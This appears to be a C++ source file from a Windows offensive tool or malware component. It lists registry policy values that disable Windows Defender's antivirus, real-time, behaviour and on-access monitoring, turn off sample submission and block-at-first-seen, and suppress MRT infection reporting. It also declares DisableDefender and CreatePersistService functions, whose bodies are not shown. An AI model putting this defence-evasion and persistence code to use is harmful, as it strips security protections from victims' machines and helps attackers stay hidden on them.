#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <map>
#include <iostream>
#include <winreg.h>
#include <winsvc.h>
#include "..\include\logger.hpp"
#include "..\include\header.hpp"
#include "..\include\util.hpp"

HKEY HKLM = HKEY_LOCAL_MACHINE;
std::map<LPCSTR, std::map<LPCSTR, DWORD>> registryEntries = {
	{"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
		{"DisableAntiSpyware", 1},
		{"DisableRoutinelyTakingAction", 1},
		{"DisableRealtimeMonitoring", 1},
		{"DisableAntiVirus", 1},
		{"DisableSpecialRunningModes", 1},
		{"ServiceKeepAlive", 0}
	}},
	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender", {
		{"DisableAntiSpyware", 1},
		{"DisableRoutinelyTakingAction", 1},
		{"DisableRealtimeMonitoring", 1},
		{"DisableAntiVirus", 1},
		{"DisableSpecialRunningModes", 1},
		{"ServiceKeepAlive", 0}
	}},
	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", {
		{"SpyNetReporting", 0},
		{"SubmitSamplesConsent", 0},
		{"DisableBlockAtFirstSeen", 1}
	}},
	{"SOFTWARE\\Policies\\Microsoft\\MRT", {
		{"DontReportInfectionInformation", 1}
	}},
	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", {
		{"ForceUpdateFromMU", 0}
	}},
	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", {
		{"DisableRealtimeMonitoring", 1},
		{"DisableOnAccessProtection", 1},
		{"DisableBehaviorMonitoring", 1},
		{"DisableScanOnRealtimeEnable", 1},
	}}
};
LPCSTR dllPath = "";

int DisableDefender();
int CreatePersistService();